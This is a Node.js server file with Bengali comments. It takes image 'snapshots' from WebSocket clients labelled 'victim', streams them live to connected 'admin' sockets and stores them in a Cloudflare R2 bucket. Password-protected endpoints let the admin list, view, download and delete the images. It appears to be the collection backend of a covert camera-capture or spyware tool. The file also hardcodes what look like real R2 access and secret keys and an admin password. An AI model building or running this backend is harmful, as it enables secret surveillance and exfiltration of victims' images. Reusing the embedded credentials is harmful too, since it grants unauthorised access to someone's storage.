const express = require('express');
const http = require('http');
const path = require('path');
const { WebSocketServer, WebSocket } = require('ws');
const { S3Client, PutObjectCommand, ListObjectsV2Command, DeleteObjectCommand, GetObjectCommand } = require('@aws-sdk/client-s3');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

// Cloudflare R2 Configuration
const s3 = new S3Client({
  region: 'auto',
  endpoint: 'https://23c95ae2d34c3a47c2943536a5bf869d.r2.cloudflarestorage.com',
  credentials: {
    accessKeyId: 'df6b217090408f5b7bc2f3a9ff37afdb',
    secretAccessKey: '24a9c5f231029673c655a0d28330cb992b25ebb8ed62e1cad5e31d1e8bc6807f'
  }
});

const BUCKET = 'unistd';
const ADMIN_PASSWORD = '74722222';
const MAX_IMAGES = 300; // স্টোরেজ লিমিট ৩০০ করা হয়েছে

app.use(express.static(path.join(__dirname, 'public')));

// পাসওয়ার্ড ভেরিফাই করার মিডলওয়্যার
const checkAuth = (req, res, next) => {
  const pwd = req.query.pwd;
  if (pwd === ADMIN_PASSWORD) {
    next();
  } else {
    res.status(401).json({ error: 'Unauthorized access' });
  }
};

// ১. স্টোর থাকা ছবিগুলোর লিস্ট পাওয়ার API
app.get('/api/images', checkAuth, async (req, res) => {
  try {
    const command = new ListObjectsV2Command({ Bucket: BUCKET, Prefix: 'snapshot_' });
    const data = await s3.send(command);
    if (!data.Contents) return res.json([]);

    const images = data.Contents
      .map(file => ({
        filename: file.Key,
        timestamp: new Date(file.LastModified).getTime()
      }))
      .sort((a, b) => b.timestamp - a.timestamp);

    res.json(images);
  } catch (error) {
    console.error('Fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch images' });
  }
});

// ২. ছবি দেখার (View) API
app.get('/api/images/view/:filename', checkAuth, async (req, res) => {
  try {
    const command = new GetObjectCommand({ Bucket: BUCKET, Key: req.params.filename });
    const data = await s3.send(command);
    res.setHeader('Content-Type', 'image/jpeg');
    data.Body.pipe(res);
  } catch (error) {
    res.status(404).send('Image not found');
  }
});

// ৩. ছবি ডাউনলোড করার API
app.get('/api/images/download/:filename', checkAuth, async (req, res) => {
  try {
    const command = new GetObjectCommand({ Bucket: BUCKET, Key: req.params.filename });
    const data = await s3.send(command);
    res.setHeader('Content-Type', 'image/jpeg');
    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    data.Body.pipe(res);
  } catch (error) {
    res.status(404).send('Image not found');
  }
});

// ৪. ছবি ডিলিট করার API
app.delete('/api/images/:filename', checkAuth, async (req, res) => {
  try {
    const command = new DeleteObjectCommand({ Bucket: BUCKET, Key: req.params.filename });
    await s3.send(command);
    res.json({ success: true });
  } catch (error) {
    console.error('Delete error:', error);
    res.status(500).json({ error: 'Failed to delete image' });
  }
});

let adminSockets = new Set();

wss.on('connection', (ws, req) => {
  const requestUrl = new URL(req.url || '/', `http://${req.headers.host || 'localhost'}`);
  const mode = requestUrl.searchParams.get('mode');

  if (mode === 'admin') {
    adminSockets.add(ws);
    ws.on('close', () => adminSockets.delete(ws));
    return;
  }

  if (mode !== 'victim') {
    ws.close(1008, 'Invalid mode');
    return;
  }

  ws.on('message', async (rawMessage) => {
    try {
      const data = JSON.parse(rawMessage.toString());
      if (data.type !== 'image' || typeof data.image !== 'string') return;

      const timestamp = Date.now();
      const filename = `snapshot_${timestamp}.jpg`;

      // ১. রিয়েল-টাইমে ছবি সরাসরি এডমিনের কাছে পাঠানো (সবার আগে)
      const payload = JSON.stringify({ type: 'new_image', image: data.image, filename, timestamp });
      for (const admin of adminSockets) {
        if (admin.readyState === WebSocket.OPEN) {
          admin.send(payload);
        }
      }

      // ২. এরপর ব্যাকগ্রাউন্ডে ক্লাউডফ্লেয়ারে আপলোড করার চেষ্টা করা
      try {
        const base64Data = data.image.replace(/^data:image\/jpeg;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');

        await s3.send(new PutObjectCommand({
          Bucket: BUCKET,
          Key: filename,
          Body: buffer,
          ContentType: 'image/jpeg'
        }));

        // অতিরিক্ত ছবি মুছে ফেলা (৩০০টির বেশি হলে)
        const listCmd = new ListObjectsV2Command({ Bucket: BUCKET, Prefix: 'snapshot_' });
        const listData = await s3.send(listCmd);
        if (listData.Contents && listData.Contents.length > MAX_IMAGES) {
          const sorted = listData.Contents.sort((a, b) => a.LastModified - b.LastModified);
          const toDelete = sorted.length - MAX_IMAGES;
          for (let i = 0; i < toDelete; i++) {
            await s3.send(new DeleteObjectCommand({ Bucket: BUCKET, Key: sorted[i].Key }));
          }
        }
      } catch (uploadError) {
        console.error('Cloudflare Upload Error:', uploadError.message);
      }

    } catch (error) {
      console.error('WebSocket Error:', error.message);
    }
  });
});

const PORT = Number(process.env.PORT) || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
